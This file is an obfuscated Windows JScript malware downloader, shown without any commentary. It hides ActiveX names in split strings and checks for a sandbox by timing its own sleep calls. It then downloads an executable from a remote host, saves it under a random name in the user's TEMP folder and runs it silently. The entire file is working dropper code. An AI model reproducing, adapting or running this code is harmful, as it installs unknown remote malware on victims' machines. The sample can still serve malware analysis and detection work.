var TC = false;
var M = "Create"+"Object";
var SH = function GX() {return WScript[M]("WScript"+".Shell");}(), PU = 11;
var TR = "MSXML2"+".XMLHTTP";
var I0 = 2;
var Y0 = I0 - 2;
function H(UR){SH["Run"](UR, Y0, Y0);};
function RW(){return TR + "";};
function QX(Q, WW0){Y0 = Y0 * 1; return Q - WW0;};
function Y(){return M;};
/*@cc_on
  @if (@_win32 || @_win64)
    TC = true;
  @end
@*/
if (TC)
{
var PK = "";
function W(){return 22;};
var BD = 0; var W0 = 0;
function BW()
{
var WW = new this["Date"]();
var I = WW["getUTCMilliseconds"]();
WScript["Sleep"](W());
var WW = new this["Date"]();
var H0 = WW["getUTCMilliseconds"]();
WScript["Sleep"](W());
var WW = new this["Date"]();
var C0 = WW["getUTCMilliseconds"]();
var BD = "O";
BD = QX(H0, I);
var W0 = "GM";
W0 = QX(C0, H0);
PK = "open";
return QX(BD, W0);
}
var FB = false;
var K = false;
for (var X = Y0; X < W() * 1; X++){if (BW() != Y0){
FB = true; 
W0 = "31" + 11 * BD + W0; 
K = true; 
break;
}}
function L() {return ((FB == true) && (FB == K)) ? 1 : Y0;};
if (FB && L() && K){
function V() {return SH["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "5RZ22fVw0lXE.ex" + "e";};
 P = RW();
 R = WScript[M](P);
 var C = 1;
do { 
	for (;C;){
	try {
		if (C == 1)
		{
			R[PK]("GET", "http://vtdrive.kz/f6dh1a", false);
			R["send"]();
			M0 = "Sleep";
			C = 2;
		}
		WScript[M0](W() + 120); 
		if (R["readystate"] < 2 * 2) continue;
		C = Y0;
		function OY(VX) {var WS = (1, 2, 3, 4, 5, VX); return WS;};
		ZS = WScript[Y()]("ADODB.Stream");
		P = ZS;
		P[PK]();
		P["type"] = OY(1);
		P["write"](R["ResponseBody"]);
		ZS["position"] = OY(Y0);
		P["Save" + "ToFile"](V(), 2);
		ZS["cl"+"ose"]();
		ZG = V();
		H(ZG);
	} catch(RX){};};
}while (C);
}
}

